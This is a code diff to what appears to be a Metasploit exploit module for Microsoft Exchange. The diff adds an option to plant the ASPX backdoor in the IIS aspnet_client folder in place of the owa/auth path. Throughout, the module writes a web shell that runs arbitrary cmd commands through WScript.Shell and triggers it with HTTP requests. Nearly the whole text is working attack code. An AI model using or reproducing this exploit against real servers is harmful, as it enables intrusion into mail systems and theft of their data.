@@ -104,12 +104,14 @@ class MetasploitModule < Msf::Exploit::Remote
 
     register_options([
       OptString.new('EMAIL', [true, 'A known email address for this organization']),
-      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']])
+      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']]),
+      OptBool.new('UseAlternatePath', [true, 'Use the IIS root dir as alternate path', false])
     ])
 
     register_advanced_options([
       OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\Program Files\\Microsoft\\Exchange Server\\V15']),
       OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\auth']),
+      OptString.new('IISBasePath', [true, 'The base path where IIS wwwroot directory is', 'C:\\inetpub\\wwwroot']),
       OptBool.new('ForceExploit', [false, 'Override check result', false]),
       OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
       OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),
@@ -122,11 +124,10 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(cmd, _opts = {})
-    web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')
     cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c #{cmd}\").StdOut.ReadAll());"
     send_request_raw(
       'method' => 'POST',
-      'uri' => normalize_uri(web_dir, @random_filename),
+      'uri' => normalize_uri(web_directory, @random_filename),
       'ctype' => 'application/x-www-form-urlencoded',
       'data' => "#{@random_inputname}=#{cmd}"
     )
@@ -346,14 +347,12 @@ class MetasploitModule < Msf::Exploit::Remote
 
     fail_with(Failure::Unknown, 'Could\'t write the payload on the remote target') if remote_file.empty?
 
-    web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')
-
     # wait a lot.
     i = 0
     while i < datastore['MaxWaitLoop']
       received = send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(web_dir, remote_file)
+        'uri' => normalize_uri(web_directory, remote_file)
       })
       if received && (received.code == 200)
         break
@@ -437,11 +436,26 @@ class MetasploitModule < Msf::Exploit::Remote
     SOAP
   end
 
+  def web_directory
+    if datastore['UseAlternatePath']
+      web_dir = 'aspnet_client'
+    else
+      web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')
+    end
+    web_dir
+  end
+
   def write_payload(exploit_info)
     # exploit_info: [server_name, sid, session, canary, oab_id]
+
     remote_file = "#{rand_text_alpha(4..8)}.aspx"
-    remote_path = "#{datastore['ExchangeBasePath'].split(':')[1]}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}"
-    remote_path = "\\\\127.0.0.1\\#{datastore['ExchangeBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"
+    if datastore['UseAlternatePath']
+      remote_path = "#{datastore['IISBasePath'].split(':')[1]}\\aspnet_client"
+      remote_path = "\\\\127.0.0.1\\#{datastore['IISBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"
+    else
+      remote_path = "#{datastore['ExchangeBasePath'].split(':')[1]}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}"
+      remote_path = "\\\\127.0.0.1\\#{datastore['ExchangeBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"
+    end
 
     data = {
       'identity': {
@@ -499,7 +513,11 @@ class MetasploitModule < Msf::Exploit::Remote
     @random_filename = shell_info[1]
 
     print_good("Yeeting #{datastore['PAYLOAD']} payload at #{peer}")
-    remote_file = "#{datastore['ExchangeBasePath']}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}\\#{@random_filename}"
+    if datastore['UseAlternatePath']
+      remote_file = "#{datastore['IISBasePath']}\\aspnet_client\\#{@random_filename}"
+    else
+      remote_file = "#{datastore['ExchangeBasePath']}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}\\#{@random_filename}"
+    end
 
     # trigger powa!
     case target['Type']
